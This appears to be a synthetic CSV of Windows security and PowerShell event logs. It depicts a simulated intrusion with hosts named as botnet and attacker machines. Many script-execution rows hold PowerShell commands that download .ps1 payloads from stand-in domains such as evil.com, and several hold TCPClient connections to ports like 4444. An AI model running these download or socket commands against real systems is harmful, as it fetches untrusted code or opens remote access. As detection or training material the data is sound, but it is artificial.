EventID,SystemTime,TargetUserName,IpAddress,WorkstationName,ProcessName,EventDescription,ScriptContent,SourcePort,DestinationPort
5156,2025-05-15T15:45:30.678901,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54364,80
4625,2025-05-15T15:45:35.789012,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:45:40.890123,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:45:45.901234,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-WmiObject -Class Win32_ComputerSystem,-,-,-
5156,2025-05-15T15:45:50.012345,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54365,80
4625,2025-05-15T15:45:55.123456,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:46:00.234567,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4104,2025-05-15T15:46:05.345678,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://exploit.com/script.ps1 -OutFile C:\Temp\script.ps1,-,-,-
5156,2025-05-15T15:46:10.456789,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54366,80
4625,2025-05-15T15:46:15.567890,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4624,2025-05-15T15:46:20.678901,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:46:25.789012,LocalUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4625},-,-,-
5156,2025-05-15T15:46:30.890123,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54367,80
4625,2025-05-15T15:46:35.901234,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:46:40.012345,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:46:45.123456,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.5',3333),-,-,-
1,2025-05-15T15:46:50.234567,IEUser,-,SRV01,C:\Windows\System32\cmd.exe,Sysmon Process Create,C:\Windows\System32\cmd.exe,-,-,-
5156,2025-05-15T15:46:55.345678,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54368,80
4625,2025-05-15T15:47:00.456789,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:47:05.567890,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4104,2025-05-15T15:47:10.678901,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://virus.com/payload.ps1 -OutFile C:\Temp\payload.ps1,-,-,-
5156,2025-05-15T15:47:15.789012,-,192.168.1.10,WKSTN01,-,Network Connection (RDP),-,54369,3389
4625,2025-05-15T15:47:20.890123,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:47:25.901234,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:47:30.012345,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-Command -ScriptBlock {Get-Service} -ComputerName SRV10,-,-,-
5156,2025-05-15T15:47:35.123456,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54370,80
4625,2025-05-15T15:47:40.234567,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4624,2025-05-15T15:47:45.345678,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:47:50.456789,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-WmiObject -Class Win32_OperatingSystem,-,-,-
5156,2025-05-15T15:47:55.567890,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54371,80
4625,2025-05-15T15:48:00.678901,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:48:05.789012,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4104,2025-05-15T15:48:10.890123,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://mal.com/script.ps1 -OutFile C:\Temp\script.ps1,-,-,-
5156,2025-05-15T15:48:15.901234,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54372,80
4625,2025-05-15T15:48:20.012345,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4624,2025-05-15T15:48:25.123456,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:48:30.234567,LocalUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4624},-,-,-
5156,2025-05-15T15:48:35.345678,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54373,80
4625,2025-05-15T15:48:40.456789,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:48:45.567890,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:48:50.678901,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.6',4444),-,-,-
1,2025-05-15T15:48:55.789012,IEUser,-,SRV01,C:\Windows\System32\notepad.exe,Sysmon Process Create,C:\Windows\System32\notepad.exe,-,-,-
5156,2025-05-15T15:49:00.890123,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54374,80
4625,2025-05-15T15:49:05.901234,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:49:10.012345,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4104,2025-05-15T15:49:15.123456,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://attack.com/payload.ps1 -OutFile C:\Temp\payload.ps1,-,-,-
5156,2025-05-15T15:49:20.234567,-,192.168.1.10,WKSTN01,-,Network Connection (RDP),-,54375,3389
4625,2025-05-15T15:49:25.345678,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4624,2025-05-15T15:49:30.456789,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:49:35.567890,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-Command -ScriptBlock {Get-Process} -ComputerName SRV11,-,-,-
5156,2025-05-15T15:49:40.678901,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54376,80
4625,2025-05-15T15:49:45.789012,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:49:50.890123,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:49:55.901234,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-WmiObject -Class Win32_ComputerSystem,-,-,-
5156,2025-05-15T15:50:00.012345,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54377,80
4625,2025-05-15T15:50:05.123456,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4624,2025-05-15T15:50:10.234567,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4104,2025-05-15T15:50:15.345678,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://evil.com/script.ps1 -OutFile C:\Temp\script.ps1,-,-,-
5156,2025-05-15T15:50:20.456789,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54378,80
4625,2025-05-15T15:50:25.567890,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:50:30.678901,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:50:35.789012,LocalUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4625},-,-,-
5156,2025-05-15T15:50:40.890123,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54379,80
4625,2025-05-15T15:50:45.901234,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:50:50.012345,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:50:55.123456,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.7',5555),-,-,-
1,2025-05-15T15:51:00.234567,IEUser,-,SRV01,C:\Windows\System32\cmd.exe,Sysmon Process Create,C:\Windows\System32\cmd.exe,-,-,-
5156,2025-05-15T15:51:05.345678,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54380,80
4625,2025-05-15T15:51:10.456789,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4624,2025-05-15T15:51:15.567890,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4104,2025-05-15T15:51:20.678901,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://phish.com/payload.ps1 -OutFile C:\Temp\payload.ps1,-,-,-
5156,2025-05-15T15:51:25.789012,-,192.168.1.10,WKSTN01,-,Network Connection (RDP),-,54381,3389
4625,2025-05-15T15:51:30.890123,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:51:35.901234,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:51:40.012345,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-Command -ScriptBlock {Get-Service} -ComputerName SRV12,-,-,-
5156,2025-05-15T15:51:45.123456,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54382,80
4625,2025-05-15T15:51:50.234567,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4624,2025-05-15T15:51:55.345678,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:52:00.456789,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-WmiObject -Class Win32_OperatingSystem,-,-,-
5156,2025-05-15T15:52:05.567890,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54383,80
4625,2025-05-15T15:52:10.678901,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:52:15.789012,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4104,2025-05-15T15:52:20.890123,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://hack.com/script.ps1 -OutFile C:\Temp\script.ps1,-,-,-
5156,2025-05-15T15:52:25.901234,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54384,80
4625,2025-05-15T15:52:30.012345,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:52:35.123456,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:52:40.234567,LocalUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4625},-,-,-
5156,2025-05-15T15:52:45.345678,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54385,80
4625,2025-05-15T15:52:50.456789,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4624,2025-05-15T15:52:55.567890,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4104,2025-05-15T15:53:00.678901,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.8',6666),-,-,-
1,2025-05-15T15:53:05.789012,IEUser,-,SRV01,C:\Windows\System32\notepad.exe,Sysmon Process Create,C:\Windows\System32\notepad.exe,-,-,-
5156,2025-05-15T15:53:10.890123,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54386,80
4625,2025-05-15T15:53:15.901234,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:53:20.012345,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4104,2025-05-15T15:53:25.123456,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://attack.com/payload.ps1
